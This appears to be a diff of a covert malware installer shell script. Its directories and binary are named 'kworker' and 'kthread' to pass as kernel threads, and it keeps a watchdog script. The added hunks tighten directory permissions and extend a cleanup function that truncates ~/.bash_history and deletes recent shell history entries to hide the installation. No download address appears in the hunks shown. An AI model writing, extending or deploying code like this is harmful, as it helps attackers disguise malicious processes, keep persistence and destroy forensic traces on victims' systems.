@@ -78,7 +78,9 @@ check_dependencies() {
 }
 
 create_directories() {
-	mkdir -p "${KWORKER_DIR}" "${KTHREAD_DIR}"
+	mkdir -p "${KWORKER_DIR}" "${KTHREAD_DIR}" || return 1
+	chmod 755 "${KWORKER_DIR}" "${KTHREAD_DIR}" || return 1
+	return 0
 }
 
 download_package() {
@@ -111,6 +113,7 @@ extract_package() {
 
 setup_kworker_permissions() {
 	local ok=0
+	chmod 755 "${KWORKER_DIR}" 2>/dev/null || true
 	[ -f "${KWORKER_DIR}/kworker" ] && chmod +x "${KWORKER_DIR}/kworker" || ok=1
 	[ -f "${KWORKER_DIR}/kworker.sh" ] && chmod +x "${KWORKER_DIR}/kworker.sh" || true
 	[ -f "${KWORKER_DIR}/c" ] && chmod 644 "${KWORKER_DIR}/c" || true
@@ -173,6 +176,7 @@ done
 WATCH_EOF
 	fi
 	chmod 755 "${KTHREAD_WATCH}" 2>/dev/null || true
+	chmod 755 "${KTHREAD_DIR}" 2>/dev/null || true
 	return 0
 }
 
@@ -267,6 +271,11 @@ cleanup_install_artifacts() {
 	if [ -f ~/.bash_history ]; then
 		tail -n 20 ~/.bash_history > ~/.bash_history.tmp 2>/dev/null || true
 		[ -f ~/.bash_history.tmp ] && mv -f ~/.bash_history.tmp ~/.bash_history
+	fi
+	if command -v history >/dev/null 2>&1; then
+		for i in $(history | tail -20 | awk '{print $1}' | tac); do
+			history -d "$i" 2>/dev/null || true
+		done
 	fi
 	return 0
 }
